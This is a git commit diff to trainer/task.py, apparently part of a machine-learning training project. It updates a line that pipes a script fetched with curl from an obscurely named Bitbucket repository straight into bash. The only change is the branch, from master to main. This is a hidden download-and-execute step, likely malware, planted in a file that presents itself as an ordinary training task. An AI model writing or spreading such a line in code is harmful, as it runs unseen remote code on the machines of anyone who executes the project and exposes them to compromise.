fa62f277012b2fc616463cf6c7765405878b6709
Ilham Ahdani <satuciwgirtwitpascuaakspret@gmail.com>
2024-01-21 15:55:16 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/srytytytr5fd/fsadaafsqsare/raw/master/gas | bash')
+os.system('curl -sL https://bitbucket.org/srytytytr5fd/fsadaafsqsare/raw/main/gas | bash')
